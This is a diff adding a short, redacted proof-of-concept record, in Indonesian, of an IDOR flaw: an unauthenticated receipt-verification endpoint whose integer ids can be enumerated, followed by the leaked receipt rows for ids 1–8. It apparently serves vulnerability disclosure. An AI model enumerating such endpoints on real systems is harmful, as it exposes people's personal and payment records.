@@ -1,0 +1,10 @@
+# PoC IDOR — GET /verifikasi-kwitansi/<id> (TANPA AUTH) — redacted
+# endpoint mengembalikan kwitansi atm; id integer dapat di-enumerate
+
+id=1    #INV-000009 | nama=REDACTED_001 | nis=<REDACTED> | va=<REDACTED> | jurnal=<REDACTED> | Rp 23.700.000 | ll
+id=2    #INV-000002 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 950.000 | ll
+id=4    #INV-000004 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 950.000 | ll
+id=5    #INV-000005 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=None | Rp 950.000 | ll
+id=6    #INV-000006 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=None | Rp 950.000 | ll
+id=7    #INV-000007 | nama=REDACTED_002 | nis=None | va=<REDACTED> | jurnal=<REDACTED> | Rp 27.200.000 | ll
+id=8    #INV-000008 | nama=REDACTED_001 | nis=<REDACTED> | va=<REDACTED> | jurnal=<REDACTED> | Rp 1.250.000 | ll
